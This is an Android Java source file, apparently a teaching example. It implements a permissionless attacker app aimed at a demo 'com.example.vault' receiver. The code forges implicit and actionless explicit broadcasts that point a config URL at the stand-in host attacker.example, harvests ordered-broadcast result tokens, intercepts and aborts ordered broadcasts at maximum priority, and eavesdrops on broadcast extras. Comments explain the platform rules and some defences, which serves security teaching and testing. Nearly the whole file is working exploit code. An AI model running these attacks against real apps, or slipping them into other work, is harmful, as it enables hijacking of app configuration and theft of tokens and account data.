// examples/AttackerBroadcaster.java
//
// The attacker side. Every method here is what an ordinary, permissionless app
// can do to a receiver it did not write.
//
// WHY THIS HAS TO BE AN APP AND NOT `adb shell am broadcast`
//   `adb shell` runs as uid 2000, which is not an ordinary app. It holds
//   capabilities no app has, and it is treated differently by parts of the
//   platform. A finding proven only from adb shell is not proven.
//
//   Two measured examples of the gap, from Android 11 / API 30:
//     * `am broadcast` sends an ORDERED broadcast whether you asked for one or
//       not -- the historical record for a plain `am broadcast -a X` reads
//       "ordered=true". An app calling sendBroadcast() sends an unordered one.
//       If your target only misbehaves on the ordered path, adb will show a bug
//       that an app cannot reach; if it only misbehaves on the unordered path,
//       adb will show nothing.
//     * Root (uid 0) successfully sent android.intent.action.LOCALE_CHANGED,
//       a protected broadcast that uid 2000 was refused. Elevation changes the
//       answer, so measure at the privilege level you are claiming.
//
//   Build this, install it, and prove the finding from here.
//
// BUILD AND RUN
//   cd examples/attacker-app && ./build.sh
//   adb install -r attacker.apk
//   adb shell am start -n com.attacker.bcast/.MainActivity
//
//   The measured device for this chapter (Redmi M2101K6P, Android 11 / API 30)
//   refuses `adb install` with INSTALL_FAILED_USER_RESTRICTED -- an OEM
//   restriction on installing over ADB, not a fault in the APK. On that device
//   this file is read and reasoned about rather than run; on an emulator or any
//   device without the restriction it runs as written.
//
// AUTHORISED TESTING ONLY. Every method here changes another app's state.

package com.attacker.bcast;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;

public class AttackerBroadcaster extends Activity {

    private static final String TAG = "attacker";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        forgeImplicit();
        forgeExplicit();
        harvestOrderedResult();
        interceptOrdered();
        eavesdrop();
    }

    // ------------------------------------------------------------------
    // 1. Forge the custom action implicitly.
    //
    // This is what an unprotected action buys an attacker. No permission is
    // declared by this app. Nothing authenticates the sender. The target's
    // filter matches, and its onReceive runs with attacker-chosen extras.
    //
    // The receiver is exported because the app also wanted BOOT_COMPLETED --
    // and BOOT_COMPLETED being unforgeable does nothing for the other action in
    // the same filter.
    // ------------------------------------------------------------------
    private void forgeImplicit() {
        Intent i = new Intent("com.example.vault.ACTION_SYNC_CONFIG");
        i.putExtra("config_url", "https://attacker.example/c.json");
        i.putExtra("force", true);

        // From API 26, an IMPLICIT broadcast will not wake a manifest-declared
        // receiver in a stopped app -- background execution limits. Two
        // consequences, both worth knowing:
        //   * if the target is not running, this may reach nothing;
        //   * setPackage() below makes the broadcast targeted rather than
        //     implicit, which is EXEMPT from those limits. That is the whole
        //     trick: an attacker who names the victim package gets the pre-26
        //     behaviour back.
        i.setPackage("com.example.vault");

        sendBroadcast(i);
        Log.i(TAG, "sent forged ACTION_SYNC_CONFIG");
    }

    // ------------------------------------------------------------------
    // 2. Bypass the filter entirely.
    //
    // An <intent-filter> constrains IMPLICIT resolution only. Naming the
    // component reaches an exported receiver with ANY action, or with no action
    // -- getAction() returns null and every code path that does not test it
    // still runs.
    //
    // This is why "check the action, first statement of onReceive" is not
    // paranoia. See ../26-Intent/README.md section 3.2 for the resolution rules
    // this sidesteps.
    // ------------------------------------------------------------------
    private void forgeExplicit() {
        Intent i = new Intent();
        i.setComponent(new ComponentName("com.example.vault",
                "com.example.vault.ConfigSyncReceiver"));
        // No action set at all.
        i.putExtra("config_url", "https://attacker.example/c.json");
        i.putExtra("force", true);
        sendBroadcast(i);
        Log.i(TAG, "sent actionless explicit broadcast");
    }

    // ------------------------------------------------------------------
    // 3. Harvest the ordered-broadcast result.
    //
    // sendOrderedBroadcast's resultReceiver runs in THIS process after every
    // receiver in the chain has had the Intent. Whatever the target put in
    // setResultData() arrives here.
    //
    // This is the primitive that turns an information-disclosure bug in someone
    // else's onReceive into data in your own process, with no permission and no
    // user interaction.
    // ------------------------------------------------------------------
    private void harvestOrderedResult() {
        Intent i = new Intent("com.example.vault.ACTION_SYNC_CONFIG");
        i.setPackage("com.example.vault");

        sendOrderedBroadcast(i,
                null,                       // receiverPermission: none needed
                new BroadcastReceiver() {   // the result receiver, in OUR process
                    @Override
                    public void onReceive(Context c, Intent x) {
                        Log.i(TAG, "resultCode=" + getResultCode());
                        Log.i(TAG, "resultData=" + getResultData());   // the token
                        Bundle ex = getResultExtras(false);
                        if (ex != null) {
                            for (String k : ex.keySet()) {
                                Log.i(TAG, "resultExtra[" + k + "]=" + ex.get(k));
                            }
                        }
                    }
                },
                null,                       // scheduler: main thread
                Activity.RESULT_CANCELED,   // initial code
                null,                       // initial data
                null);                      // initial extras
    }

    // ------------------------------------------------------------------
    // 4. Intercept somebody else's ordered broadcast.
    //
    // Register at runtime with a priority higher than the target's. On an
    // ordered broadcast the platform hands the Intent to the highest priority
    // first. abortBroadcast() then stops the chain: no lower-priority receiver
    // in ANY app sees it, and none of them is told why.
    //
    // Priority is a plain integer with no authorisation check. Integer.MAX_VALUE
    // is a real value on a real device -- measured on a stock Android 11 build,
    // a preinstalled app held priority=2147483647 on BOOT_COMPLETED.
    //
    // Two limits worth knowing before you rely on it:
    //   * FLAG_RECEIVER_NO_ABORT (0x08000000) on the sender's Intent makes the
    //     broadcast unabortable -- it still runs in priority order, but
    //     abortBroadcast() is ignored. It is the sender's defence.
    //   * You cannot intercept what you cannot receive. If the sender supplied
    //     a receiverPermission you do not hold, you are not in the chain at all.
    // ------------------------------------------------------------------
    private void interceptOrdered() {
        IntentFilter f = new IntentFilter("com.example.vault.SYNC_COMPLETE");
        f.setPriority(Integer.MAX_VALUE);
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent x) {
                Log.i(TAG, "intercepted: " + x.getAction());
                Log.i(TAG, "carried result: " + getResultData());
                // Rewrite what the next receiver sees...
                setResultData("tampered");
                // ...or make sure there is no next receiver.
                abortBroadcast();
            }
        }, f);
    }

    // ------------------------------------------------------------------
    // 5. Just listen.
    //
    // The cheapest attack in this file. It sends nothing, needs no permission,
    // and produces no log entry in the victim. Any implicit broadcast the
    // target sends without setPackage() and without a receiverPermission lands
    // here, extras and all.
    //
    // ConfigSyncReceiver-vulnerable.java's SYNC_COMPLETE announcement carries
    // an account id. This method collects it.
    // ------------------------------------------------------------------
    private void eavesdrop() {
        IntentFilter f = new IntentFilter();
        f.addAction("com.example.vault.SYNC_COMPLETE");
        f.addAction("com.example.vault.ACTION_SYNC_CONFIG");
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent x) {
                Log.i(TAG, "overheard " + x.getAction());
                Bundle ex = x.getExtras();
                if (ex != null) {
                    for (String k : ex.keySet()) {
                        Log.i(TAG, "  extra[" + k + "]=" + ex.get(k));
                    }
                }
            }
        }, f);
    }
}
